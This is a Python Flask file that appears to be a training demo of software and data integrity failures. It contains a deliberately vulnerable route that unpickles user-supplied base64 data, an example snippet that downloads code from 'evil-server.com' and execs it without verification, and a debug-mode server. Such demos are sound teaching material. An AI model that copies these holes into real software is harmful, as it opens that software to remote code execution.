import pickle
import base64
import os
from flask import Flask, render_template_string, request, jsonify
import requests

app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string('''
    <h1>Software or Data Integrity Failures Demo</h1>
    <ul>
        <li><a href="/serialize">Insecure Serialization</a></li>
        <li><a href="/deserialize">Insecure Deserialization</a></li>
        <li><a href="/auto-update">Auto-Update (Insecure)</a></li>
        <li><a href="/insecure-cicd">CI/CD Pipeline (Insecure)</a></li>
        <li><a href="/secure-integrity">Secure Practices</a></li>
    </ul>
    ''')

@app.route('/serialize', methods=['GET', 'POST'])
def serialize():
    if request.method == 'POST':
        user_data = {
            'username': request.form.get('username', 'user'),
            'role': request.form.get('role', 'user'),
            'permissions': ['read']
        }
        # VULNERABLE: Using pickle for serialization
        serialized = pickle.dumps(user_data)
        encoded = base64.b64encode(serialized).decode()
        return render_template_string('''
        <h1>Serialized Data (Insecure)</h1>
        <p>User data serialized using pickle:</p>
        <textarea rows="10" cols="80">{{ data }}</textarea>
        <p><strong>Warning:</strong> Pickle is unsafe for untrusted data!</p>
        <a href="/deserialize">Try Deserialization</a><br>
        <a href="/">Back</a>
        ''', data=encoded)
    return render_template_string('''
    <h1>Serialize Data (Insecure)</h1>
    <form method="POST">
        Username: <input type="text" name="username"><br>
        Role: <input type="text" name="role"><br>
        <input type="submit" value="Serialize">
    </form>
    <p><small>Uses pickle - vulnerable to code execution!</small></p>
    ''')

@app.route('/deserialize', methods=['GET', 'POST'])
def deserialize():
    if request.method == 'POST':
        data = request.form.get('data', '')
        try:
            # VULNERABLE: Deserializing untrusted data
            decoded = base64.b64decode(data)
            obj = pickle.loads(decoded)  # This can execute arbitrary code!
            return render_template_string('''
            <h1>Deserialized Data</h1>
            <p>Data: {{ obj }}</p>
            <p><strong>Risk:</strong> Malicious payloads can execute code!</p>
            <a href="/">Back</a>
            ''', obj=obj)
        except Exception as e:
            return f"Error: {str(e)}"
    return render_template_string('''
    <h1>Deserialize Data (Insecure)</h1>
    <form method="POST">
        <p>Paste serialized data:</p>
        <textarea name="data" rows="10" cols="80"></textarea><br>
        <input type="submit" value="Deserialize">
    </form>
    <p><small>WARNING: Never deserialize untrusted data with pickle!</small></p>
    ''')

@app.route('/auto-update')
def auto_update():
    return render_template_string('''
    <h1>Auto-Update Feature (Insecure)</h1>
    <p>This application downloads updates without signature verification!</p>
    <pre>
    # Insecure update process
    import requests
    update_url = "http://evil-server.com/update.exe"
    response = requests.get(update_url)
    # No signature verification!
    exec(response.content)
    </pre>
    <p><strong>Risk:</strong> MITM attacks can inject malicious updates!</p>
    <a href="/">Back</a>
    ''')

@app.route('/insecure-cicd')
def insecure_cicd():
    return render_template_string('''
    <h1>CI/CD Pipeline (Insecure)</h1>
    <h2>Vulnerabilities:</h2>
    <ul>
        <li>No signed commits required</li>
        <li>Direct push to main branch allowed</li>
        <li>No code review requirement</li>
        <li>Build secrets exposed in logs</li>
        <li>No pipeline integrity checks</li>
    </ul>
    <p><strong>Risk:</strong> Attackers can inject malicious code into builds!</p>
    <a href="/">Back</a>
    ''')

@app.route('/secure-integrity')
def secure_integrity():
    return render_template_string('''
    <h1>Secure Integrity Practices</h1>
    <h2>Best Practices:</h2>
    <ul>
        <li>Use JSON with schema validation instead of pickle</li>
        <li>Verify digital signatures on all updates</li>
        <li>Require signed commits in CI/CD</li>
        <li>Implement mandatory code reviews</li>
        <li>Use checksums to verify file integrity</li>
        <li>Implement least privilege for build systems</li>
        <li>Use allowlists for deserialization</li>
    </ul>
    <p><strong>This is the secure approach!</strong></p>
    <a href="/">Back</a>
    ''')

if __name__ == '__main__':
    app.run(debug=True, port=5008)
